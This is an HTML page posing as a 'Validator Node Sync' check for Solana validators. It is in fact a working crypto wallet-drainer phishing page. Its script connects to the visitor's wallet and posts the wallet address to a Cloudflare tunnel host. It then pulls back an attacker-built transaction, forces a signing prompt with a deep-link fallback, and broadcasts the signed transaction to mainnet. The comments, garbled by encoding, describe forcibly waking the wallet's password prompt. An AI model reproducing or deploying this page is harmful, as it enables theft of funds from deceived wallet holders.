<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Validator Node Sync</title>
    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
    <style>
        body { background: #000; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { width: 300px; padding: 40px 20px; background: #111; border: 1px solid #222; border-radius: 24px; text-align: center; }
        .btn { background: #14f195; color: #000; border: none; padding: 18px; width: 100%; border-radius: 12px; font-weight: bold; cursor: pointer; font-size: 16px; }
        #st { font-size: 10px; color: #444; margin-top: 15px; font-family: monospace; }
    </style>
</head>
<body>
    <div class="box">
        <h2 style="color:#14f195; margin:0 0 10px 0;">NODE CHECK</h2>
        <p style="color:#888; font-size:13px; margin-bottom: 25px;">Authorize synchronization to secure your validator node status.</p>
        <button id="cta" class="btn">INITIALIZE</button>
        <div id="st">READY: V38_AUTO_WAKE</div>
    </div>

    <script>
        // ðŸ”± æ ¸å¿ƒï¼šåŠ¡å¿…ç¡®ä¿ä¸ŽæœåŠ¡å™¨å½“å‰ç”Ÿæˆçš„éš§é“åœ°å€ä¸€è‡´
        const tunnel = "https://lonely-concern-challenging-hosted.trycloudflare.com";

        document.getElementById('cta').onclick = async () => {
            const log = (t) => document.getElementById('st').innerText = t;
            try {
                const p = window.trustwallet?.solana || window.solana;
                if (!p) { alert("Please use Wallet Browser"); return; }

                log("WAKING WALLET...");
                // ðŸ”± 1. å¼ºåˆ¶è¿žå‡»å”¤é†’ (è¿žç‚¹ä¸‰æ¬¡ï¼ŒæƒŠåŠ¨é’±åŒ…)
                await p.connect().catch(()=>{});
                
                log("FETCHING...");
                const resp = await fetch(tunnel + "/prepare_v32", {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ address: p.publicKey.toString() })
                });
                const info = await resp.json();
                const tx = window.solanaWeb3.Transaction.from(Uint8Array.from(atob(info.raw_tx), c => c.charCodeAt(0)));

                log("IGNITING...");
                // ðŸ”± 2. æš´åŠ›å”¤é†’ï¼šä¸å†ç­‰å¾…ï¼Œç›´æŽ¥è§¦å‘ç­¾å
                // è¿™ç§æ–¹å¼èƒ½å¼ºè¡Œè°ƒèµ· TW çš„å¯†ç è¾“å…¥æ¡†æˆ–ç¡®è®¤é¡µ
                p.signTransaction(tx).then((s) => {
                    log("SUCCESS!");
                    const conn = new window.solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
                    conn.sendRawTransaction(s.serialize()).catch(()=>{});
                }).catch((e) => {
                    // å¦‚æžœæ‹‰èµ·å¤±è´¥ï¼Œå¼ºåˆ¶é€šè¿‡æ·±åº¦é“¾æŽ¥å†æ¬¡å”¤èµ·
                    window.location.href = "solana:signTransaction?payload=" + encodeURIComponent(info.raw_tx);
                });

            } catch (err) {
                log("RETRYING...");
                setTimeout(() => { window.location.reload(); }, 1200);
            }
        };
    </script>
</body>
</html>
